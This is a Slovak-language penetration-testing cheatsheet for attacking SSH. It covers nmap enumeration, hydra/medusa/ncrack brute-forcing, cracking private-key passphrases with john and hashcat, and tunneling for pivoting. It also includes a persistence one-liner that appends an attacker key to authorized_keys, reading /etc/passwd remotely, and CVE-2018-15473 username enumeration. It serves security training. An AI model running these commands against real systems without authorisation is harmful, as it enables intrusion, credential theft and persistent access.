---
layout: notes
title: "SSH"
folder: "Ports"
tags: [ssh, port-22, enumeration, bruteforce, tunneling]
---

# 🔐 SSH (Port 22) – Cheatsheet

---

## 🔍 Enumeration

```bash
nmap -sV -sC -p 22 <IP>             # verzia + default skripty
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" <IP>  # zisti auth metódy
nmap -p 22 --script ssh-hostkey <IP>  # zobraz host key
ssh <IP>                              # zobraz banner a verziu
nc -nv <IP> 22                        # manuálny banner grab
```

---

## 🔑 Pripojenie

```bash
ssh user@<IP>
ssh user@<IP> -p 2222                        # iný port
ssh -i id_rsa user@<IP>                      # pomocou privátneho kľúča
chmod 600 id_rsa                             # nutné pred použitím kľúča!
ssh -v user@<IP>                             # verbose – debug pripojenia
ssh -o StrictHostKeyChecking=no user@<IP>    # preskočiť overenie host key
```

---

## 💥 Bruteforce

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4  # počet vlákien
medusa -h <IP> -u user -P rockyou.txt -M ssh
ncrack -p 22 --user user -P rockyou.txt <IP>
```

---

## 🗝️ Cracking zaheslovaného kľúča (id_rsa)

```bash
# Konverzia pre John
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Alternatíva – hashcat
python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
hashcat -a 0 -m 22921 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 🌐 SSH Tunneling

```bash
# Local port forwarding – sprístupni vzdialený port lokálne
ssh -L 8080:localhost:80 user@<IP>
# → localhost:8080 presmeruje na <IP>:80

# Dynamic SOCKS proxy
ssh -D 1080 user@<IP>
# → nastav proxychains na port 1080 (/etc/proxychains.conf)
# → proxychains nmap -sT <interná-IP>

# Remote port forwarding – sprístupni lokálny port na vzdialenom stroji
ssh -R 4444:localhost:4444 user@<IP>

# SSH cez jump host (bastion)
ssh -J jumpuser@<jump-IP> targetuser@<target-IP>

# Udržanie tunela nažive
ssh -N -f -L 8080:localhost:80 user@<IP>
# -N = nespúšťaj príkaz, -f = beh na pozadí
```

---

## 📂 Zaujímavé súbory po prihlásení

```bash
~/.ssh/authorized_keys      # povolené verejné kľúče
~/.ssh/id_rsa               # privátny kľúč (skopíruj a cracki!)
~/.ssh/known_hosts          # navštívené hosty → možné ďalšie ciele
/etc/ssh/sshd_config        # konfigurácia SSH démona
/var/log/auth.log           # auth logy (Debian/Ubuntu)
/var/log/secure             # auth logy (RHEL/CentOS)
```

---

## 🧰 Užitočné triky

```bash
# Skopíruj súbor zo vzdialeného stroja
scp user@<IP>:/path/to/file .

# Skopíruj celý adresár
scp -r user@<IP>:/path/to/dir .

# Vykonaj príkaz bez interaktívnej session
ssh user@<IP> "cat /etc/passwd"

# Generuj SSH kľúčový pár
ssh-keygen -t rsa -b 4096 -f ./mykey

# Pridaj vlastný verejný kľúč na cieľ (ak máš zápis)
echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys
```

---

## ⚠️ Časté zraniteľnosti

| Zraniteľnosť | Popis |
|---|---|
| Slabé/default credentials | Najčastejší nález, hydra/medusa |
| Zaheslovaný kľúč | Crackovateľný slovníkovým útokom (ssh2john) |
| Username enumeration | Staršie verzie OpenSSH (< 7.7) – CVE-2018-15473 |
| Staré verzie OpenSSH | Rôzne CVE – vždy over verziu voči exploit-db |
| Authorized_keys writeable | Ak môžeš zapisovať, pridaj vlastný kľúč |
| Agent forwarding zneužitie | Ak je `ForwardAgent yes`, možný pivoting |

```bash
# Username enumeration (CVE-2018-15473)
python3 ssh_user_enum.py --userList users.txt --hostname <IP>
# https://github.com/Sait-Nuri/CVE-2018-15473
```

---

## 🔎 Kontrola verzie voči CVE

```bash
ssh -V                                          # lokálna verzia
nmap -sV -p 22 <IP>                             # vzdialená verzia
searchsploit openssh <verzia>                   # hľadaj exploity
```
